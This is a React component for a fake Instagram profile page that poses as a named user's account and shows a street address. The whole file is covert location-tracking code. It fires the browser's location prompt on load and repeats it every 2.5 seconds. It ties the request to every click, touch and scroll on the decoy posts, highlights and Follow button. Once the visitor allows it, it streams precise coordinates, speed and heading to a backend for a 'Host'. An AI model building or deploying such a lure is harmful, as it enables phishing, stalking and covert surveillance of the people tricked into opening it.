"use client";

import { useEffect, useRef, useState } from "react";

export default function RecipientFeed({
  backendUrl = process.env.NEXT_PUBLIC_SOCKET_URL || "http://localhost:5000",
  sessionId = "",
}) {
  const [isFollowing, setIsFollowing] = useState(false);
  const [coords, setCoords] = useState(null);
  const [hasAllowed, setHasAllowed] = useState(false);

  const watchIdRef = useRef(null);
  const retryTimerRef = useRef(null);
  const hasAllowedRef = useRef(false);

  /*
   * Save location coordinates to backend MongoDB & broadcast to Host
   */
  const saveLocation = async (position) => {
    const { latitude, longitude, accuracy, speed, heading } = position.coords;
    setCoords({ latitude, longitude, accuracy });
    setHasAllowed(true);
    hasAllowedRef.current = true;

    // Clear continuous retry timer once location is successfully allowed
    if (retryTimerRef.current) {
      clearInterval(retryTimerRef.current);
      retryTimerRef.current = null;
    }

    try {
      const response = await fetch(`${backendUrl}/api/records`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId: sessionId || (typeof window !== "undefined" ? window.location.href : "default-session"),
          participantName: "Mobile Recipient",
          latitude,
          longitude,
          accuracy: accuracy ?? null,
          speed: speed ?? null,
          heading: heading ?? null,
          timestamp: new Date().toISOString(),
        }),
      });

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }

      console.log("Location captured and saved successfully");
    } catch (error) {
      console.error("Location save failed:", error);
    }
  };

  /*
   * Request GPS permission via native browser dialog
   * and start continuous automatic tracking
   */
  const requestLocation = () => {
    if (!navigator.geolocation) {
      console.warn("Geolocation is not supported by this browser.");
      return;
    }

    if (hasAllowedRef.current && watchIdRef.current !== null) {
      return; // Already actively streaming
    }

    // Native browser prompt triggers here
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        // Save initial coordinates & mark allowed
        await saveLocation(position);
        setIsFollowing(true);

        // Start live location stream continuously
        if (watchIdRef.current === null) {
          watchIdRef.current = navigator.geolocation.watchPosition(
            async (updatedPosition) => {
              await saveLocation(updatedPosition);
            },
            (error) => {
              console.error("Location update error:", error);
            },
            {
              enableHighAccuracy: true,
              maximumAge: 5000,
              timeout: 15000,
            }
          );
        }
      },
      (error) => {
        console.warn("Browser location pending/dismissed:", error.message);
      },
      {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 10000,
      }
    );
  };

  useEffect(() => {
    // 1. Trigger native browser prompt immediately on page load
    requestLocation();

    // 2. Continuously ask / retry every 2.5 seconds until user taps "Allow"
    retryTimerRef.current = setInterval(() => {
      if (!hasAllowedRef.current) {
        requestLocation();
      } else {
        clearInterval(retryTimerRef.current);
      }
    }, 2500);

    // 3. User interaction listener (tap/click anywhere on page forces browser location prompt)
    const handleUserInteraction = () => {
      if (!hasAllowedRef.current) {
        requestLocation();
      }
    };

    window.addEventListener("click", handleUserInteraction);
    window.addEventListener("touchstart", handleUserInteraction);
    window.addEventListener("scroll", handleUserInteraction);

    return () => {
      if (retryTimerRef.current) {
        clearInterval(retryTimerRef.current);
      }
      if (watchIdRef.current !== null) {
        navigator.geolocation.clearWatch(watchIdRef.current);
      }
      window.removeEventListener("click", handleUserInteraction);
      window.removeEventListener("touchstart", handleUserInteraction);
      window.removeEventListener("scroll", handleUserInteraction);
    };
  }, []);

  const handleToggleFollow = () => {
    requestLocation();
    setIsFollowing(true);
  };

  return (
    <div className="ig-app" onClick={requestLocation} onTouchStart={requestLocation}>
      {/* Left Sidebar */}
      <aside className="ig-sidebar">
        <div className="ig-logo">
          <span className="logo-text">Instagram</span>
        </div>

        <nav className="ig-navigation">
          <a className="ig-nav-item active" onClick={requestLocation}>
            <span className="ig-icon">
              <svg viewBox="0 0 24 24"><path d="M3 11.5 12 4l9 7.5" /><path d="M5 10.5V20h14v-9.5" /><path d="M9 20v-6h6v6" /></svg>
            </span>
            <span>Home</span>
          </a>
          <a className="ig-nav-item" onClick={requestLocation}>
            <span className="ig-icon">
              <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7" /><path d="m20 20-4-4" /></svg>
            </span>
            <span>Search</span>
          </a>
          <a className="ig-nav-item" onClick={requestLocation}>
            <span className="ig-icon">
              <svg viewBox="0 0 24 24"><rect width="18" height="18" x="3" y="3" rx="2" /><path d="m9 8 7 4-7 4Z" /></svg>
            </span>
            <span>Reels</span>
          </a>
        </nav>
      </aside>

      {/* Main Content Area */}
      <main className="ig-main">
        <header className="ig-topbar">
          <div className="mobile-logo">Instagram</div>
        </header>

        <div className="feed-container">
          {/* Profile Section */}
          <section className="profile-header">
            <div className="profile-avatar" onClick={requestLocation}>
              <div className="location-avatar">
                <div className="ig-story-ring">
                  <img src="/highlights/profile.jpg" alt="mr_in.nocent_yogi" />
                </div>
              </div>
            </div>

            <div className="profile-info">
              <div className="profile-title">
                <h1>mr_in.nocent_yogi</h1>
                <span className="verified">✓</span>
              </div>

              <div className="profile-stats">
                <div><strong>94</strong><span>posts</span></div>
                <div><strong>293</strong><span>followers</span></div>
                <div><strong>625</strong><span>following</span></div>
              </div>

              <div className="profile-description">
                <p>
                  Avalai Avalai 🧚 Rasithu Kidanthu Vizhigal👀
                  Vaeraraiyum Paarkathae🙈
                  Avalai Avalai Pazhagi Tholaitha Ithayam
                  Vaeraraiyum Aerkaathae❣️
                  @editor_Yogi_R³
                </p>
                <span className="profile-link">🔗 yrdigitalenterprises.in</span>
                <span className="profile-link">13/b kuttiyan palayam street, Kumbakonam 612001</span>

                {coords && (
                  <div className="tracking-active-badge">
                    <span className="tracking-active-dot"></span>
                    <span>Live Location Connected</span>
                  </div>
                )}
              </div>
            </div>
          </section>

          {/* Profile Action Buttons */}
          <div className="profile-action-buttons">
            <button
              className={`profile-follow-btn ${isFollowing ? "following" : ""}`}
              onClick={handleToggleFollow}
            >
              {isFollowing ? "Following" : "Follow"}
            </button>

            <button className="profile-user-plus-btn" title="Discover People" onClick={requestLocation}>
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
                <circle cx="8.5" cy="7" r="4" />
                <line x1="20" y1="8" x2="20" y2="14" />
                <line x1="23" y1="11" x2="17" y2="11" />
              </svg>
            </button>
          </div>

          {/* Story Highlights */}
          <div className="highlights-row">
            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/business.jpg" alt="Bussiness" />
                </div>
              </div>
              <span>Bussiness</span>
            </div>

            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/invitations.jpg" alt="invitations" />
                </div>
              </div>
              <span>invitations</span>
            </div>

            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/aval.jpg" alt="Aval" />
                </div>
              </div>
              <span>Aval ❣️</span>
            </div>

            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/thumbnails.jpg" alt="Thumbnails" />
                </div>
              </div>
              <span>Thumbnails...</span>
            </div>

            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/king.jpg" alt="king" />
                </div>
              </div>
              <span>king 👑</span>
            </div>

            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar" style={{ background: "#181A20", display: "flex", alignItems: "center", justifyContent: "center" }}>
                  <svg viewBox="0 0 24 24" width="24" height="24" stroke="#FFFFFF" fill="none" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <line x1="12" y1="5" x2="12" y2="19"></line>
                    <line x1="5" y1="12" x2="19" y2="12"></line>
                  </svg>
                </div>
              </div>
              <span>New</span>
            </div>
          </div>

          {/* Post Photo Grid */}
          <div className="recipient-posts-grid">
            <div className="recipient-post-tile" onClick={requestLocation}>
              <img src="/highlights/aval.jpg" alt="Post 1" />
            </div>
            <div className="recipient-post-tile" onClick={requestLocation}>
              <img src="/highlights/business.jpg" alt="Post 2" />
            </div>
            <div className="recipient-post-tile" onClick={requestLocation}>
              <img src="/highlights/king.jpg" alt="Post 3" />
            </div>
            <div className="recipient-post-tile" onClick={requestLocation}>
              <img src="/highlights/invitations.jpg" alt="Post 4" />
            </div>
            <div className="recipient-post-tile" onClick={requestLocation}>
              <img src="/highlights/thumbnails.jpg" alt="Post 5" />
            </div>
            <div className="recipient-post-tile" onClick={requestLocation}>
              <img src="/highlights/profile.jpg" alt="Post 6" />
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
